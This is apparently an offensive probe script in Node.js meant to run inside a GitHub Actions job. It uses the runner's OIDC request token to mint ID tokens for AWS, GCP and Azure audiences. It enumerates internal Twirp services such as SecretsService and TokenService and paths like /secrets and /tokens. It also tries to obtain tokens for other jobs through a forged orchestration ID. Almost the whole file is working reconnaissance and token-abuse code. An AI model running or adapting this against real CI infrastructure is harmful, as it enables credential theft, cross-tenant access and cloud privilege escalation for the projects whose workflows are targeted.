const https = require('https');

// New runner infrastructure discovered via env dump (v15b)
// Old: ACTIONS_RESULTS_URL + ACTIONS_RUNTIME_TOKEN → gone in runner 20260611.554
// New: ACTIONS_ID_TOKEN_REQUEST_URL → run-actions-2-azure-{region}.actions.githubusercontent.com
// ACTIONS_ORCHESTRATION_ID → still present (now used as path component)

const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
const GITHUB_REF = process.env.GITHUB_REF || '';

function httpsReq(hostname, path, method, body, extraHeaders) {
  return new Promise((resolve) => {
    const headers = { 'Authorization': 'Bearer ' + OIDC_TOKEN, ...(extraHeaders || {}) };
    let data = null;
    if (body) {
      data = typeof body === 'string' ? body : JSON.stringify(body);
      headers['Content-Type'] = 'application/json';
      headers['Content-Length'] = Buffer.byteLength(data);
    }
    const req = https.request({ hostname, path, method: method || 'GET', headers },
      (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 600), headers: res.headers })); });
    req.on('error', e => resolve({ status: 'ERR', body: e.message }));
    if (data) req.write(data);
    req.end();
  });
}

async function main() {
  if (!OIDC_URL || !OIDC_TOKEN) { console.log('[FATAL] No OIDC env vars'); return; }

  const oidcParsed = new URL(OIDC_URL);
  const newHost = oidcParsed.hostname; // run-actions-2-azure-{region}.actions.githubusercontent.com
  const runUUID = ORCHESTRATION_ID.split('.')[0];
  const jobName = ORCHESTRATION_ID.split('.')[1] || 'probe';

  console.log('=== V16: New Runner Infrastructure Probe ===');
  console.log('New host:', newHost);
  console.log('OIDC URL path:', oidcParsed.pathname + oidcParsed.search);
  console.log('Run UUID:', runUUID, '| Job:', jobName);
  console.log('Repo:', GITHUB_REPOSITORY, '| Ref:', GITHUB_REF);

  // === PART 1: OIDC standard token ===
  console.log('\n=== PART 1: Get standard OIDC token ===');
  const oidcPath = oidcParsed.pathname + oidcParsed.search + '&audience=api.github.com';
  const r1 = await httpsReq(newHost, oidcPath, 'GET');
  console.log('[OIDC] api.github.com:', r1.status, '|', r1.body.substring(0, 200));

  // Decode JWT sub claim to see what the token encodes
  if (r1.status === 200) {
    try {
      const jwt = JSON.parse(r1.body).value;
      if (jwt) {
        const parts = jwt.split('.');
        const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
        console.log('[OIDC] sub:', payload.sub);
        console.log('[OIDC] iss:', payload.iss);
        console.log('[OIDC] aud:', JSON.stringify(payload.aud));
        console.log('[OIDC] ref:', payload.ref, '| sha:', payload.sha);
        console.log('[OIDC] repository:', payload.repository);
        console.log('[OIDC] jti:', payload.jti);
        console.log('[OIDC] Full claims (non-secret):', JSON.stringify({
          sub: payload.sub, iss: payload.iss, aud: payload.aud, ref: payload.ref,
          sha: payload.sha, repository: payload.repository,
          event_name: payload.event_name,
          actor: payload.actor, workflow: payload.workflow,
          job_workflow_ref: payload.job_workflow_ref,
          runner_environment: payload.runner_environment,
        }, null, 2));
      }
    } catch(e) { console.log('[OIDC] Parse error:', e.message); }
  }

  // === PART 2: Arbitrary audience test ===
  console.log('\n=== PART 2: Arbitrary audience OIDC tokens ===');
  const audiences = [
    'sts.amazonaws.com',
    'https://sts.amazonaws.com',
    'storage.googleapis.com',
    'management.azure.com',
    'https://management.azure.com/',
    'ssm.amazonaws.com',
    'arbitrary-test-audience-that-should-be-blocked',
  ];
  for (const aud of audiences) {
    const path = oidcParsed.pathname + oidcParsed.search + '&audience=' + encodeURIComponent(aud);
    const r = await httpsReq(newHost, path, 'GET');
    if (r.status === 200) {
      try {
        const jwt = JSON.parse(r.body).value;
        if (jwt) {
          const payload = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
          console.log('[AUD] ' + aud + ': 200 | aud=' + JSON.stringify(payload.aud) + ' | sub=' + payload.sub);
        } else { console.log('[AUD] ' + aud + ': 200 but no value field | ' + r.body.substring(0, 100)); }
      } catch(e) { console.log('[AUD] ' + aud + ': 200 parse error:', e.message); }
    } else {
      console.log('[AUD] ' + aud + ': ' + r.status + ' | ' + r.body.substring(0, 100));
    }
  }

  // === PART 3: Host enumeration — probe the new infrastructure host ===
  // The old Twirp services may be available on this new host
  console.log('\n=== PART 3: Probe new host for Twirp services ===');
  const TWIRP_SERVICES = [
    'github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL',
    'github.actions.results.api.v1.CacheService/CreateCacheEntry',
    'github.actions.results.api.v1.ArtifactService/ListArtifacts',
    'github.actions.results.api.v1.ArtifactService/CreateArtifact',
    'github.actions.results.api.v1.LogService/Get',
    'github.actions.results.api.v1.TokenService/Get',
    'github.actions.results.api.v1.SecretsService/Get',
  ];
  for (const svc of TWIRP_SERVICES) {
    const r = await httpsReq(newHost, '/twirp/' + svc, 'POST', {});
    const label = r.status === 404 && r.body.includes('bad_route') ? 'NOT_EXIST' :
                  r.status === 404 ? 'NOT_EXIST(404)' :
                  r.status === 401 ? '!! AUTH_EXISTS(401)' :
                  r.status === 403 ? '!! FORBIDDEN(403)' :
                  r.status === 400 ? '!! BAD_REQ(400)' :
                  r.status === 200 ? '!!! 200 OK' : 'HTTP_' + r.status;
    if (!label.startsWith('NOT_EXIST')) {
      console.log('[TWIRP] ' + svc + ': ' + label + ' | ' + r.body.substring(0, 100));
    }
  }

  // === PART 4: Path traversal on OIDC URL (double-slash test) ===
  // The OIDC URL has // in the path: /85//idtoken/{orchestration_id}
  // What's at /85/?, /85/artifacts, /85/caches, etc.?
  console.log('\n=== PART 4: Path exploration on new host ===');
  const basePath = oidcParsed.pathname.split('/idtoken/')[0]; // e.g. /85/
  const explorePaths = [
    basePath + '/',
    basePath + '/health',
    basePath + '/artifacts',
    basePath + '/caches',
    basePath + '/logs',
    basePath + '/secrets',
    basePath + '/runs',
    basePath + '/tokens',
    '/',
    '/health',
    '/metrics',
    '/api',
    '/api/v1',
    '/api/v1/artifacts',
    '/api/v1/caches',
  ];
  for (const p of explorePaths) {
    const r = await httpsReq(newHost, p, 'GET');
    if (r.status !== 404 && r.status !== 'ERR') {
      console.log('[PATH] ' + p + ': ' + r.status + ' | ' + r.body.substring(0, 100));
    } else if (r.status === 'ERR') {
      console.log('[PATH] ' + p + ': ERR | ' + r.body.substring(0, 80));
    }
  }

  // === PART 5: Check /idtoken path with different orchestration IDs ===
  // Can we get OIDC tokens for OTHER jobs by using their orchestration IDs?
  console.log('\n=== PART 5: Cross-orchestration OIDC token test ===');
  const fakeOrchId = '00000000-0000-0000-0000-000000000000.probe.__default';
  const idtokenBase = oidcParsed.pathname.split('/idtoken/')[0] + '/idtoken/';
  const paths = [
    idtokenBase + fakeOrchId + '?audience=api.github.com',
    idtokenBase + ORCHESTRATION_ID + '?audience=api.github.com', // our own (should work)
  ];
  for (const p of paths) {
    const r = await httpsReq(newHost, p, 'GET');
    console.log('[ORCH] ' + p.substring(0, 60) + '...: ' + r.status + ' | ' + r.body.substring(0, 120));
  }

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message));
